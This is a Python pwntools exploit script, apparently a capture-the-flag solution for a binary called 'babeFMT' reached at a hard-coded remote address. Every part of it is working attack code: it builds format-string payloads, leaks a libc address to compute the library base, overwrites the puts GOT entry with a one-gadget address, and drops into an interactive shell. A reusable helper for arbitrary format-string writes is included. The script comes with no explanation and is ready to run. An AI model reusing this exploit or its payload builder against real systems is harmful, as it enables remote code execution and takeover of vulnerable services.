from pwn import *
import sys
import os

remote_ip,port = '34.126.117.181', 2222
binary = 'babeFMT'
brkpts = '''
b*0x804924b
'''

if len(sys.argv)>1:
    io = remote(remote_ip,port)

else:
    io = process(binary)
    #gdb.attach(io,brkpts)
    
puts = 0x0804c01c
func = 0x08049213

re = lambda a: io.recv(a)
ru = lambda a: io.recvuntil(a)
rl = lambda  : io.recvline()
s  = lambda a: io.send(a)
sl = lambda a: io.sendline(a)
sla= lambda a,b: io.sendlineafter(a,b)
sa = lambda a,b: io.sendafter(a,b)

def get_length(a,b):
    while(hex(a)[-4:]!=b):
        a = a+1
    return a

def fstring_payload(addr,waddr):
    addr=hex(addr).replace("0x","")
    if len(addr)<8:
        addr=addr.rjust(8,"0")
    var1=int(addr[-4:],16)
    s2=addr[-8:-4]
    var2=get_length(var1,s2)-var1
    payload = "%{}c%{}$hn%{}c%{}$hn".format(var1,14,var2,15).ljust(40,"a")
    payload += p32(waddr) 
    payload += p32(waddr+2)
    return payload

if __name__== "__main__":
    
    sla("name? : \n","A A A")
    sleep(0.2)

    payload = "%62$p" + "AAA"
    payload += p32(puts) 
    payload += p32(puts+2) + b"A"*8
    payload += "%{}d".format(int(0x9213)-len(payload)-3-2).encode()
    payload += "%6$hn"
    payload += " %p "*20
    payload += "%{}d".format(int(0x10804)-len(payload)-0x200+0x7009-0x90).encode()
    payload += "%7$hn"

    #payload = payload.ljust(100, b"X")
    sl(payload)


    leak = int(re(10),16)-18
    log.info("Leak {} ".format(hex(leak)))
    base = leak - 0xb2350
    log.info("Base {} ".format(hex(base)))

    gadgets23 = [0x3ac6c, 0x3ac6e, 0x3ac72, 0x3ac79]
    gadgets24 = [0x3aedc, 0x3aede, 0x3aee2, 0x3aee9]

    gadget = base + gadgets24[3]
    log.info("Gadget {} ".format(hex(gadget)))
    payload = fstring_payload(gadget, puts).ljust(0x30,"\x00")
    payload += "\x00"*8
    sl(payload)

    io.interactive()
